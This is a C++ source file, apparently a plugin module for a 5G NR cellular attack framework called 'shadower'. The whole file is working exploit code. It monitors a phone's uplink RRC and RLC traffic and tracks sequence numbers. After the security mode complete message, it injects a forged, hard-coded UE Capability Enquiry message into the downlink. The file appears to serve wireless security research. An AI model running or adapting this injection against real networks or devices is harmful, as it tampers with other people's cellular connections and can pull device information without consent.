#include "shadower/hdr/exploit.h"

const uint8_t ue_capability_enquiry_raw[] = {0x01, 0x03, 0x00, 0x05, 0x00, // ACK SN
                                             0x01, 0x10, 0xc0, 0x04, 0x00, 0x04, 0x34, 0x02, 0x01, 0x20, 0x01, 0x01,
                                             0x34, 0x00, 0x10, 0x82, 0xe7, 0xf2, 0x3f, 0x00, 0x00, 0x00, 0x00};

class UECapabilityEnquiry : public Exploit
{
public:
  UECapabilityEnquiry(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                      SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    ue_capability_enquiry.reset(new std::vector<uint8_t>(
        ue_capability_enquiry_raw, ue_capability_enquiry_raw + sizeof(ue_capability_enquiry_raw)));
  }

  void setup() override
  {
    f_ack_sn                = wd_field("rlc-nr.am.ack-sn");
    f_sn                    = wd_field("rlc-nr.am.sn");
    f_rrc_setup_request     = wd_filter("nr-rrc.c1 == 0");
    f_rrc_sec_mode_complete = wd_filter("nr-rrc.c1 == 5");
  }

  void pre_dissection(wd_t* wd) override
  {
    wd_register_field(wd, f_ack_sn);
    wd_register_field(wd, f_sn);
    wd_register_filter(wd, f_rrc_setup_request);
    wd_register_filter(wd, f_rrc_sec_mode_complete);
  }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    bool send_msg = true;
    if (direction == UL) {
      // If ACK SN from UE received, then update the sequence number to new sequence number
      wd_field_info_t ack_sn_info = wd_read_field(wd, f_ack_sn);
      if (ack_sn_info) {
        uint32_t ack_sn_recv = packet_read_field_uint32(ack_sn_info);
        logger.info("Received ACK SN: %u", ack_sn_recv);
        if (ack_sn_recv > dl_sn) {
          dl_sn = ack_sn_recv;
        }
      }

      // If UL message received from the base station, then we have to send the ACK back to UE
      wd_field_info_t sn_info = wd_read_field(wd, f_sn);
      if (sn_info) {
        uint32_t sn_recv = packet_read_field_uint32(sn_info);
        if (sn_recv > dl_ack_sn) {
          dl_ack_sn = sn_recv;
          logger.info(YELLOW "Update ACK sequence number to %u" RESET, dl_ack_sn);
        }
      }

      if (wd_read_filter(wd, f_rrc_setup_request)) {
        logger.info("Received RRC setup request");
        dl_sn = 0;
        return;
      }

      if (wd_read_filter(wd, f_rrc_sec_mode_complete)) {
        logger.info("UE Capability Enquiry after security mode command");
        send_ue_capability_enquiry();
        return;
      }
    }
  }

private:
  void send_ue_capability_enquiry()
  {
    ue_capability_enquiry->data()[3]  = dl_ack_sn & 0xff;
    ue_capability_enquiry->data()[8]  = dl_sn & 0xff;
    ue_capability_enquiry->data()[10] = dl_sn & 0xff;
    dl_buffer_queue.push(ue_capability_enquiry);
  }

  std::shared_ptr<std::vector<uint8_t> > ue_capability_enquiry;

  wd_field_t  f_ack_sn;
  wd_field_t  f_sn;
  wd_filter_t f_rrc_setup_request;
  wd_filter_t f_rrc_sec_mode_complete;
  uint32_t    dl_sn     = 0;
  uint32_t    dl_ack_sn = 1;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new UECapabilityEnquiry(dl_buffer_queue_, ul_buffer_queue_);
}
}